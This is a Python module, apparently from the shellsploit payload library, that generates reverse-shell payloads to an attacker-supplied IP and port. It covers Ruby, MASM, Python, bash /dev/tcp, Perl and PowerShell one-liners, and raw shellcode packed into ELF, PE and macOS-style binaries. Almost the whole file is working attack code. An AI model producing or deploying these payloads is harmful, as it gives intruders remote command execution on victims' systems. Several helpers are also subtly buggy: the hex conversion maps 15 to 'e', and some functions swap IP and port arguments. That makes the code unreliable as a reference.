#------------------Bombermans Team------------------------------------------# 
# Author  : B3mB4m
# Concat  : b3mb4m@protonmail.com
# Project : https://github.com/b3mb4m/shellsploit-library
# LICENSE : https://github.com/b3mb4m/shellsploit-library/blob/master/LICENSE
#----------------------------------------------------------------------------#


def decimaltohex( number):
    number = int(number)
    list = []
    while number >= 1:
        if   number % 16 == 10:  list.append("a")
        elif number % 16 == 11:  list.append("b")
        elif number % 16 == 12:  list.append("c")
        elif number % 16 == 13:  list.append("d")
        elif number % 16 == 14:  list.append("e")
        elif number % 16 == 15:  list.append("e")
        else: list.append(str(number % 16))
        number /= 16
    return "".join(list[::-1])

def LPORT( port):
    import re
    db = []
    fixmesempai = re.findall('..?', decimaltohex(str(port)))
    for x in fixmesempai:
        if len(x) == 1:
            x = f"0{x}"
        db.append(x)
    return "\\x"+"\\x".join(db)

def LIP( ip):
    ip = str(ip).split(".")
    db2 = []
    db = [decimaltohex( int(x)) for x in ip]
    for x in db: 
        if len(x) == 1:
            x = f"0{x}"
        db2.append(x)
    return "\\x"+"\\x".join(db2)


def rbreverse_tcp( IP=None, PORT=None):
    return """#!/usr/bin/env ruby
require 'socket'
require 'open3'

RHOST = "%s" 
PORT = "%s"

begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
rescue
	sleep 20
	retry
	end

begin
	while line = sock.gets
	    Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
	        IO.copy_stream(stdout_and_stderr, sock)
	        end  
	end
rescue
	retry
end 
	""" % (
        IP,
        PORT,
    )

def asmreverse_tcp( IP=None, PORT=None):
    return '''.386
.model flat, stdcall
option casemap:none
include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\ws2_32.inc
include \masm32\include\masm32.inc
includelib \masm32\lib\ws2_32.lib
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\masm32.lib 

.data
  cmd     db "cmd",0
  UrIP    db "{0}",0
  port    db "{1}",0
.data?
  sinfo   STARTUPINFO<>
  pi      PROCESS_INFORMATION<>
  sin     sockaddr_in<>
  WSAD    WSADATA<>
  Wsocket dd ?
.code
start:
    invoke WSAStartup, 101h, addr WSAD 
    invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0
           mov Wsocket, eax
           mov sin.sin_family, 2
    invoke atodw, addr port
    invoke htons, eax
           mov sin.sin_port, ax
    invoke gethostbyname, addr UrIP
          mov eax, [eax+12]
          mov eax, [eax]
          mov eax, [eax]
          mov sin.sin_addr, eax

          mov eax,Wsocket
          mov sinfo.hStdInput,eax
          mov sinfo.hStdOutput,eax
          mov sinfo.hStdError,eax     
          mov sinfo.cb,sizeof STARTUPINFO
          mov sinfo.dwFlags,STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
 shellagain:
    invoke connect, Wsocket, addr sin , sizeof(sockaddr_in) 
    invoke CreateProcess,NULL,addr cmd,NULL,NULL,TRUE,8000040h,NULL,NULL,addr sinfo,addr pi
    invoke WaitForSingleObject,pi.hProcess,INFINITE
	jmp shellagain
 ret
end start
	'''.format(
        IP, PORT
    )


def pyreverse_tcp( IP=None, PORT=None):
    #Connect back and spawn shell.
    padd = f's.connect(("{str(IP)}",{str(PORT)}))'
    ret = [
        "import socket,subprocess,os",
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
        "",
        "os.dup2(s.fileno(),0)",
        "os.dup2(s.fileno(),1)",
        "os.dup2(s.fileno(),2)",
        """p=subprocess.call(["/bin/sh","-i"]);"""
    ]
    ret[2] = padd
    return "\n".join(ret)



def shreverse_tcp( IP=None, PORT=None):
    #Connect back and spawn shell.
    from random import randint
    rand = randint(0, 99)
    return "0<&%d-;exec %d<>/dev/tcp/%s/%s;sh <&%d >&%d 2>&%d" % (
        rand,
        rand,
        IP,
        PORT,
        rand,
        rand,
        rand,
    )

def plreverse_tcp( IP=None, PORT=None):
    #Connect back and spawn shell.
    ret =  "perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::"
    padd = f'INET(PeerAddr,"{IP}:{PORT}");'
    ret += padd
    ret += "STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'"
    return ret


def linx86reverse_tcp( IP=None, PORT=None):
    shellcode = (
        r"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
        + r"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
    )
    shellcode += LIP(IP)
    shellcode += r"\x66\x68"
    shellcode += LPORT(PORT)
    shellcode += r"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
    shellcode += r"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    byteman = (
        "7f454c4601010100000000000000000002000300010000005480040"
        + "834000000000000000000000034002000010000000000000001000"
    )
    byteman  += "0000000000000800408008004089c000000001000000700000000100000"
    byteman += shellcode.replace(r"\x", "")
    return byteman


#BETA, need test.
def winreverse_tcp( IP=None, PORT=None):
    byteman = (
        r"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
        + r"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
    )
    byteman += r"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    byteman += r"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
    byteman += r"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
    byteman += r"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    byteman += r"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
    byteman += r"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
    byteman += r"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
    byteman += r"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32"
    byteman += r"\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff"
    byteman += r"\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
    byteman += r"\x00\xff\xd5\x6a\x05\x68"
    byteman += LIP( PORT)
    byteman += r"\x68\x02\x00"
    byteman += LPORT(PORT)
    byteman += r"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    byteman += r"\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
    byteman += r"\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5"
    byteman += r"\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8"
    byteman += r"\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
    byteman += r"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53"
    byteman += r"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee"
    byteman += r"\xc3"

    huuha = (
        "4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c010200002179560000000000000000e0000f030b010238000200000002000000000000001000000010000000000000000040000010000000020000040000000100000004000000000000000030000000040000383f00000300000000002000001000000000100000100000000000001000000000000000000000000020000014000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e746578740000001a000000001000000002000000040000000000000000000000000000200000602e6964617461000014000000002000000002000000060000000000000000000000000000400000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
        + byteman.replace(r"\x", "")
    )
    huuha += "ffffffff00000000ffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
    return huuha

def macosx86reverse_tcp( IP=None, PORT=None):
    byteman =  r"\x68"
    byteman += LIP( IP)
    byteman += r"\x68\xff\x02"
    byteman += LPORT( PORT)
    byteman += r"\x89\xe7\x31\xc0\x50\x6a\x01\x6a\x02\x6a\x10\xb0\x61\xcd\x80"
    byteman += r"\x57\x50\x50\x6a\x62\x58\xcd\x80\x50\x6a\x5a\x58\xcd\x80\xff"
    byteman += r"\x4f\xe8\x79\xf6\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
    byteman += r"\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80"
    return byteman.replace(r"\x", "")

def linx64reverse_tcp( IP=None, PORT=None):
    padd = (
        r"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
        + r"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
    )
    padd += r"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
    padd += LIP(PORT)
    padd += r"\xc7\x44\x24\x04"
    padd += LPORT(IP)
    padd += r"\x48\x89\xe6\x6a\x10"
    padd += r"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
    padd += r"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
    padd += r"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
    padd += r"\x5f\x6a\x3b\x58\x0f\x05"
    shellcode = (
        "7f454c4602010100000000000000000002003e000100000080004000000000004000000000000000b0000000000000000000000040003800010040000300020001000000050000000000000000000000000040000000000000004000000000009f000000000000009f0000000000000000002000000000000000000000000000"
        + padd.replace("\n", "")
    )
    shellcode += "5002e7368737472746162002e7465787400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000010000000600000000000000800040000000000080000000000000001f000000000000000000000000000000100000000000000000000000000000000100000003000000000000000000000000000000000000009f000000000000001100000000000000000000000000000001000000000000000000000000000000"
    return shellcode


def powershell( ip,port):
    db = ["" for _ in range(8)]
    payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port})'
    db[0] = payload
    db[1] = '$stream = $client.GetStream()'
    db[2] = '[byte[]]$bytes = 0..255|%{0}'
    db[3] = 'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){'
    db[4] = '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)'
    db[5] = '$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> "'
    db[6] = '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)'
    db[7] = '$stream.Flush()};$client.Close()'
    return ";".join(db)
